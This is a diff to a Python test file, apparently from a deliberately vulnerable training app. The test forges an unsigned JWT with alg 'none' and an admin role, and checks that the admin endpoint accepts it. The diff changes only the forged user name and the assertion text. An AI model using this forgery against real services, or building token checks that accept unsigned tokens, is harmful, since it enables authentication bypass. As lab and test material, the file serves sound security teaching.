@@ -28,15 +28,14 @@ def test_admin_api_accepts_a_forged_alg_none_token(client):
         return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
 
     header = {"alg": "none", "typ": "JWT"}
-    payload = {"user": "attacker", "role": "admin"}
+    payload = {"user": "pwned-via-alg-none", "role": "admin"}
     header_seg = b64url(json.dumps(header).encode())
     payload_seg = b64url(json.dumps(payload).encode())
     forged_token = f"{header_seg}.{payload_seg}."
 
     response = client.post("/a08/admin-api", data={"token": forged_token})
     assert response.status_code == 200
-    assert b"ADMIN ACCESS GRANTED" in response.data
-    assert b"attacker" in response.data
+    assert b"ADMIN ACCESS GRANTED -- welcome, pwned-via-alg-none" in response.data
 
 
 def test_admin_api_rejects_a_tampered_hs256_token(client):
